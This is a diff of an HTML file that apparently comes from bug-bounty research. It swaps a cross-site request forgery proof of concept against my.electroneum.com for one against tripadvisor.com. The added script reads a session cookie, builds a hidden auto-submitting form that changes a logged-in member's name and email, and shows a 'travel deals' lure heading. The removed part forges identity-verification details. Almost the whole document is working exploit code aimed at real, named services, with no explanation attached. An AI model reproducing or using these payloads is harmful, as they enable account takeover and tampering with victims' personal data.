@@ -1,20 +1,77 @@
 <html>
-  <body>
-    <form method="POST" action="https://my.electroneum.com/user/update-details" enctype="multipart/form-data" id="csrfForm">
-      <input type="hidden" name="tier_two_form[address]" value="Hacked Address">
-      <input type="hidden" name="tier_two_form[employment_status]" value="employed">
-      <input type="hidden" name="tier_two_form[job_title]" value="Hacker">
-      <input type="hidden" name="tier_two_form[employer]" value="Hacker Inc">
-      <input type="hidden" name="tier_two_form[tax_number]" value="666666">
-      <input type="hidden" name="tier_two_form[previous_names]">
-      <input type="hidden" name="tier_two_form[accept_terms]" value="1">
-      <input type="hidden" name="tier_two_form[_token]" value="942063e9ba5b12486a69db2f.t8WSSoYHRQor7EtcQkgEvnHaSJ0-Yh1J2fH5O-t4ztY.mpH7E_NfBkZZiRolKzh17jCbJOtYD1sinMChQ9IUlIOCvdQetzYKZlm4PA">
-      <!-- File input is included but cannot be pre-filled. Server may require it. -->
-      <input type="file" name="tier_two_form[supporting_document]">
-      <input type="submit">
-    </form>
-    <script>
-     
-    </script>
-  </body>
+<body>
+  <script>
+  console.log("[1] Initializing CSRF PoC...");
+
+  // ====== Cookie Extraction ======
+  function getCookie(name) {
+    const cookies = document.cookie.split('; ');
+    const cookie = cookies.find(c => c.startsWith(name + '='));
+    return cookie ? decodeURIComponent(cookie.split('=')[1]) : null;
+  }
+
+  const roybattyToken = getCookie('roybatty');
+  console.log("[2] roybatty cookie value:", roybattyToken);
+
+  // ====== Request Builder ======
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'https://www.tripadvisor.com/ModuleAjax';
+  form.style.display = 'none';
+
+  const params = {
+    actions: JSON.stringify([{
+      params: {
+        firstname: "ziadbugcrowd",
+        lastname: "test", 
+        primaryEmail: "ziad686@bugcrowdninja.com"
+      },
+      name: "SAVE",
+      resource: "modules.common.entity.LoggedInMember"
+    }]),
+    context: JSON.stringify({
+      "modules.membercenter.model.ContributionCounts": [{
+        memberId: "FOY3v6GnNeOB/lMD3V9UCA=="
+      }]
+    }),
+    authenticator: "Random",
+    version: "5",
+    token: roybattyToken
+  };
+
+  Object.entries(params).forEach(([key, value]) => {
+    const input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = key;
+    input.value = value;
+    form.appendChild(input);
+  });
+
+  // ====== Debugging Interface ======
+  console.log("[3] Form parameters:", params);
+  console.log("[4] Form HTML:", form.outerHTML);
+
+  // ====== Execution Flow ======
+  document.body.appendChild(form);
+  console.log("[5] Form added to DOM");
+
+  // Create hidden iframe for cookie context
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.src = 'https://www.tripadvisor.com';
+  
+  iframe.onload = () => {
+    console.log("[6] Security context established");
+    setTimeout(() => {
+      console.log("[7] Submitting form...");
+      form.submit();
+    }, 1000);
+  };
+
+  document.body.appendChild(iframe);
+  </script>
+
+  <!-- Visual Trigger -->
+  <h1 style="color:red">Click anywhere to view travel deals!</h1>
+</body>
 </html>
